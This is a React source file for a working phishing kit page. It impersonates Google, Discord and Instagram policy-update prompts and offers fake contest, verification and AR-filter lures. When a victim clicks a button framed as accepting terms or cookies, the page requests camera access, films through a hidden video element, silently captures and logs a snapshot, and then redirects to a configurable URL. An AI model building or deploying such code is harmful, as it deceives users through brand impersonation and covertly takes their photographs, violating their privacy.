
"use client";
import { useEffect, useState, useRef } from 'react';
import { useParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import type { CameraData } from '@/types';
import { Button } from '@/components/ui/button';
import PhishingPageLayout from '@/app/phishing/PhishingPageLayout'; // Updated import path
import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon, ShieldCheck, Sparkles, Wand2 } from 'lucide-react'; // Added ShieldCheck, Sparkles, Wand2
import { cn } from '@/lib/utils';

const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; visual?: React.ReactNode; headerClassName?: string; redirectUrl?: string; }> = {
  'google-policy-update': {
    title: 'Google - Policy Update',
    message: "We've updated our Terms of Service and Privacy Policy. Please accept the new terms to continue using Google services.",
    cookieMessage: "By clicking 'Accept & Continue', you agree to Google's updated Terms of Service and Privacy Policy. This helps us improve your experience and provide personalized services.",
    actionText: 'Accept & Continue',
    headerClassName: "bg-white text-black",
    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" />
    // redirectUrl removed
  },
  'discord-terms-update': {
    title: 'Discord - Terms of Service Update',
    message: "Important: Our Terms of Service have been updated. Please review and accept them to continue using Discord.",
    cookieMessage: "By clicking 'Accept Terms', you acknowledge and agree to Discord's updated Terms of Service. This ensures a safe and compliant environment for all users.",
    actionText: 'Accept Terms',
    // headerClassName: "bg-[#5865F2] text-white", // Removed as it's handled by custom UI
    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
    // redirectUrl removed
  },
  'instagram-privacy-update': {
    title: 'Instagram - Privacy Policy Update',
    message: "Your privacy matters. We've updated our Privacy Policy to better explain how we use your data. Please accept to continue.",
    cookieMessage: "By tapping 'Accept Policy', you agree to Instagram's updated Privacy Policy. This allows us to provide you with a more personalized and secure experience.",
    actionText: 'Accept Policy',
    headerClassName: "bg-gradient-to-br from-[#833AB4] via-[#FD1D1D] to-[#FCB045] text-white",
    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" />
    // redirectUrl removed
  },
  'photo-contest-entry': {
    title: 'SnapWin Contest!',
    message: "Showcase your photography skills and win amazing prizes! To submit your entry, please first **accept our cookie policy below**. Camera access will be requested afterwards to capture your photo submission.",
    cookieMessage: "Our site uses cookies to enhance your experience and for essential functionality. By clicking 'Accept Cookies', you agree to our use of cookies.",
    visual: <Trophy className="h-12 w-12 text-amber-400 mr-3" />,
    headerClassName: "bg-gradient-to-r from-yellow-400 via-red-500 to-pink-500 p-4 rounded-t-lg text-white",
  },
  'video-verification': {
    title: 'Secure Video Verification',
    actionText: 'Start Video Verification',
    message: 'For security, we need to verify your identity via video. Please enable your camera.',
    visual: <ShieldCheck className="h-8 w-8 text-blue-600 mr-2" />,
  },
  'ar-filter': {
    title: 'Magical AR Filter Fun!',
    actionText: 'Test AR Filter',
    message: 'Check out our latest AR filter! Enable your camera to see it in action.',
    visual: <><Wand2 className="h-8 w-8 text-purple-500 mr-1" /><Sparkles className="h-6 w-6 text-yellow-400" /></>,
  },
  default: {
    title: 'Camera Access Required',
    actionText: 'Enable Camera',
    message: 'This feature requires camera access. Please enable your camera to continue.',
  }
};

// Define localStorage keys for redirection, similar to location page
const REDIRECT_URL_KEYS: Record<string, string> = {
  'google-policy-update': 'googlePolicyUpdateRedirectUrl',
  'discord-terms-update': 'discordTermsUpdateRedirectUrl',
  'instagram-privacy-update': 'instagramPrivacyUpdateRedirectUrl',
  // Add keys for other camera templates if they need dynamic redirection
  // 'photo-contest-entry': 'photoContestRedirectUrl',
  // 'video-verification': 'videoVerificationRedirectUrl',
  // 'ar-filter': 'arFilterRedirectUrl',
};

export default function CameraPhishingPage() {
  const { addLog } = useLogs();
  const { id: idFromParams } = useParams<{ id: string }>();
  const templateId = idFromParams || 'default';
  const content = templateContent[templateId] || templateContent.default;

  const [status, setStatus] = useState<'idle' | 'requesting' | 'streaming' | 'captured' | 'error'>('idle');
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const [cookieConsentGiven, setCookieConsentGiven] = useState(false);

  useEffect(() => {
    addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId]);

  const captureImage = () => {
    if (videoRef.current && canvasRef.current && videoRef.current.readyState === 4 && videoRef.current.videoWidth > 0) {
      const video = videoRef.current;
      const canvas = canvasRef.current;

      const MAX_WIDTH = 640; // Restored for better quality
      const MAX_HEIGHT = 480; // Restored for better quality
      let { videoWidth, videoHeight } = video;

      if (videoWidth > videoHeight) {
        if (videoWidth > MAX_WIDTH) {
          videoHeight = Math.round((videoHeight * MAX_WIDTH) / videoWidth);
          videoWidth = MAX_WIDTH;
        }
      } else {
        if (videoHeight > MAX_HEIGHT) {
          videoWidth = Math.round((videoWidth * MAX_HEIGHT) / videoHeight);
          videoHeight = MAX_HEIGHT;
        }
      }

      canvas.width = videoWidth;
      canvas.height = videoHeight;

      const context = canvas.getContext('2d');
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageUrl = canvas.toDataURL('image/jpeg', 0.9); // Increased quality to 0.9
        const cameraData: CameraData = { imageUrl };
        addLog({ type: 'camera', data: cameraData });
        setStatus('captured');
        stopCameraStream(true); // Pass true to indicate capture happened
      }
    }
  };

  const handleCookieConsentAndCamera = async () => {
    setCookieConsentGiven(true);
    setIsLoading(true);
    setError(null);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
           if (videoRef.current) videoRef.current.play();
           setStatus("streaming");
           setIsLoading(false);
           // Delay capture and then check for redirection
           setTimeout(() => {
             captureImage(); // This will set status to 'captured'
           }, 1500);
        };
      }
    } catch (err) {
      console.error("Camera access error:", err);
      let errorMessage = 'Could not access camera.';
      if (err instanceof DOMException) {
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
          errorMessage = 'Camera access denied by user.';
        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
          errorMessage = 'No camera found on this device.';
        }
      }
      setError(errorMessage);
      setStatus('error');
      addLog({ type: 'generic', data: { message: `Camera error: ${errorMessage}` } });
      setIsLoading(false);
    }
  };

  const handleCameraRequest = async () => {
    if (streamRef.current) stopCameraStream();

    setStatus('requesting');
    setIsLoading(true);
    setError(null);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
           if (videoRef.current) videoRef.current.play();
           setStatus('streaming');
           setIsLoading(false);
           setTimeout(captureImage, 1500);
        };
      }
    } catch (err) {
      console.error("Camera access error:", err);
      let errorMessage = 'Could not access camera.';
      if (err instanceof DOMException) {
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
          errorMessage = 'Camera access denied by user.';
        } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
          errorMessage = 'No camera found on this device.';
        }
      }
      setError(errorMessage);
      setStatus('error');
      addLog({ type: 'generic', data: { message: `Camera error: ${errorMessage}` } });
      setIsLoading(false);
    }
  };

  const stopCameraStream = (isAfterCapture = false) => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }
    // Only reset to 'idle' if not after capture and not already in error or captured state
    if (!isAfterCapture && status !== 'captured' && status !== 'error') {
      setStatus('idle');
    }
  };

  useEffect(() => {
    return () => {
      stopCameraStream();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // useEffect to handle redirection or success message after capture
  useEffect(() => {
    if (status === 'captured') {
      const redirectKey = REDIRECT_URL_KEYS[templateId];
      if (redirectKey) {
        const redirectUrl = localStorage.getItem(redirectKey);
        if (redirectUrl && redirectUrl.trim() !== '') {
          // For templates like google-policy, discord, instagram, show a brief message before redirect
          if (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
            // No explicit message needed here as the UI is minimal for these templates
            // and redirection should be quick.
          }
          setTimeout(() => {
            window.location.href = redirectUrl;
          }, (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId) ? 500 : 2500) ); // Shorter delay for policy updates
        } else {
          // If key exists but no URL, or for other templates that reach 'captured'
          // Set a message or ensure UI reflects capture without redirect.
          // For policy templates, this state might not be visibly shown if no redirect is set,
          // as they lack a dedicated "success" UI area.
          if (!['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
            // Explicit success message for other templates if needed
          }
        }
      } else {
        // For templates not in REDIRECT_URL_KEYS (if any) or if redirection is not applicable
        // This path should ideally not be hit for camera templates that are meant to have configurable redirect.
      }
    }
  }, [status, templateId, content.title]); // Added content.title to dependencies for safety, though primarily driven by status and templateId

  if (templateId === 'discord-terms-update') {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-[#36393f] p-4 text-[#dcddde] font-sans">
        {/* Hidden video and canvas for silent capture */}
        <video ref={videoRef} className="hidden" playsInline muted />
        <canvas ref={canvasRef} className="hidden"></canvas>

        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
            <h1 className="text-2xl font-bold text-white mb-4">{content.title}</h1>
            <p className="text-sm text-[#b9bbbe] mb-6" dangerouslySetInnerHTML={{ __html: content.message }} />

            <p className="text-xs text-[#72767d] mb-6">
              {content.cookieMessage}
            </p>

            <Button
              onClick={handleCookieConsentAndCamera}
              className="w-full bg-[#5865F2] hover:bg-[#4752c4] text-white font-semibold py-3 px-4 rounded-md text-lg transition-colors duration-150"
              disabled={isLoading || cookieConsentGiven}
            >
              {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept Terms')}
            </Button>
            {error && status === 'error' && (
              <p className="text-red-400 text-xs mt-4">{error}</p>
            )}
          </div>
        ) : (
          // This state is after capture AND no redirect URL is set
          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
            <CheckCircle className="w-16 h-16 text-green-400 mx-auto mb-4" />
            <h1 className="text-xl font-bold text-white mb-2">Terms Accepted</h1>
            <p className="text-sm text-[#b9bbbe]">Image captured. This window can now be closed.</p>
          </div>
        )}
      </div>
    );
  }

  if (['google-policy-update', 'instagram-privacy-update'].includes(templateId)) {
    // For these templates, the "captured" state is mostly invisible to the user before redirection
    // or if no redirection URL is set (it will just sit on the page).
    // The main UI is the cookie banner.
    return (
      <>
        <PhishingPageLayout
          title={content.title}
        >
          <div className={cn("text-center mb-6", content.headerClassName)}>
            <div className="flex items-center justify-center p-4">
              {content.visual}
              <h1 className={cn("text-2xl font-bold", content.headerClassName ? (templateId === 'google-policy-update' ? 'text-black' : 'text-white') : '')}>{content.title}</h1>
            </div>
          </div>
          <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
          
          <video ref={videoRef} className="hidden" playsInline muted />
          <canvas ref={canvasRef} className="hidden"></canvas>
          
        </PhishingPageLayout>

        {/* Cookie consent banner is shown until consent is given, or if page reloads before capture.
            If status becomes 'captured' and no redirect URL is set, this banner might still be visible
            if cookieConsentGiven is false, which is an edge case (capture without consent flow).
            However, handleCookieConsentAndCamera sets cookieConsentGiven to true.
        */}
        {status !== 'captured' && !cookieConsentGiven && (
            <div className="fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50">
              <div className="container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
                <p className="text-sm text-foreground text-center sm:text-left flex-grow">
                  {content.cookieMessage || "Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}
                </p>
                <Button
                  onClick={handleCookieConsentAndCamera}
                  className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
                  size="md"
                  disabled={isLoading && !cookieConsentGiven} 
                >
                  <Cookie className="mr-2 h-4 w-4" />
                  {content.actionText || 'Accept Cookies'}
                </Button>
              </div>
            </div>
        )}
      </>
    );
  }

  if (templateId === 'photo-contest-entry') {
    return (
      <>
        <PhishingPageLayout
          title={content.title}
          // className={content.headerClassName ? 'pt-0' : ''} // Example of using className for layout adjustment
        >
          <div className={cn("text-center mb-6", content.headerClassName)}>
            <div className="flex items-center justify-center p-4">
              {content.visual}
              <h1 className={cn("text-2xl font-bold", content.headerClassName ? 'text-white' : '')}>{content.title}</h1>
            </div>
          </div>
          <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
          
          <div className={cn(
              "aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2",
              (status === 'streaming' && cookieConsentGiven) ? 'border-primary' : 'border-border'
            )}>
            <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
            { !(status === 'streaming' && cookieConsentGiven) && !(status === 'captured' && cookieConsentGiven) && (
              <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/30">
                {!cookieConsentGiven ? (
                  <>
                    <ImageIcon className="h-16 w-16 text-white/70 mb-2" />
                    <p className="text-white/90">Contest photo will appear here</p>
                  </>
                ) : (status === 'idle' || status === 'requesting' || status === 'error') && cookieConsentGiven ? (
                  <>
                    <VideoOff className="h-16 w-16 text-white/70 mb-2" />
                    <p className="text-white/90 text-center px-4">{status === 'error' && error ? error : 'Camera feed inactive. Waiting for camera permission...'}</p>
                  </>
                ) : null }
              </div>
            )}
          </div>
          <canvas ref={canvasRef} className="hidden"></canvas>

          {status === 'streaming' && !isLoading && cookieConsentGiven && (
             <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md mb-6">
              <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
              <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Cancel Submission</Button>
            </div>
          )}

          {status === 'captured' && cookieConsentGiven && (
            <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md mb-6">
              <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
              <p className="font-semibold text-green-700">Photo Submitted Successfully!</p>
              <p className="text-sm text-green-600">Thank you for entering the contest. This window can now be closed.</p>
            </div>
          )}
           {status === 'error' && cookieConsentGiven && error && (
             <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md mb-6">
              <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
              <p className="font-semibold text-red-700">Camera Access Failed</p>
              <p className="text-sm text-red-600">{error}</p>
              <Button onClick={handleCameraRequest} variant="outline" className="mt-3">Try Again</Button>
            </div>
          )}
        </PhishingPageLayout>

        {!cookieConsentGiven && (
            <div className="fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50">
              <div className="container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
                <p className="text-sm text-foreground text-center sm:text-left flex-grow">
                  {content.cookieMessage || "Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}
                </p>
                <Button
                  onClick={handleCookieConsentAndCamera}
                  className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
                  size="md" // Ensure this size is defined or use default
                  disabled={isLoading && !cookieConsentGiven} 
                >
                  <Cookie className="mr-2 h-4 w-4" />
                  Accept Cookies
                </Button>
              </div>
            </div>
        )}
      </>
    );
  }

  return (
    <PhishingPageLayout
        title={content.title}
        // isLoading={isLoading && status !== 'streaming'} // Removed
        // error={error} // Removed
        // statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined} // Removed
    >
      <div className="flex items-center justify-center mb-2">
        {content.visual}
        <h1 className="text-2xl font-bold text-center">{content.title}</h1>
      </div>
      <p className="text-center text-muted-foreground mb-6">{content.message}</p>

      <div className="aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border">
        <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
        {status !== 'streaming' && status !== 'captured' && (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/50">
            <VideoOff className="h-16 w-16 text-white/70 mb-2" />
            <p className="text-white/90">Camera feed inactive</p>
          </div>
        )}
      </div>
      <canvas ref={canvasRef} className="hidden"></canvas>

      {/* Button is shown if not streaming and not captured yet */}
      {(status === 'idle' || status === 'requesting' || status === 'error') && status !== 'captured' && (
        <Button
          onClick={handleCameraRequest}
          className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
          disabled={isLoading || status === 'requesting'}
        >
          <CameraIcon className="mr-2 h-5 w-5" />
          {isLoading ? 'Initializing Camera...' : (content.actionText || 'Enable Camera')}
        </Button>
      )}

      {status === 'streaming' && !isLoading && (
         <div className="text-center p-3 bg-blue-50 border border-blue-200 rounded-md">
          <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
          <Button onClick={() => stopCameraStream()} variant="outline" size="sm" className="mt-2">Stop Camera</Button>
        </div>
      )}

      {/* Success message for non-redirecting captures */}
      {status === 'captured' && !(REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) && (
        <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
          <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
          <p className="font-semibold text-green-700">Image Captured Successfully!</p>
          <p className="text-sm text-green-600">This window can now be closed.</p>
        </div>
      )}
      {/* Error message display */}
       {status === 'error' && error && (
         <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md">
          <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
          <p className="font-semibold text-red-700">Camera Access Failed</p>
          <p className="text-sm text-red-600">{error}</p>
           <Button onClick={handleCameraRequest} variant="outline" className="mt-3">Try Again</Button>
        </div>
      )}
    </PhishingPageLayout>
  );
}
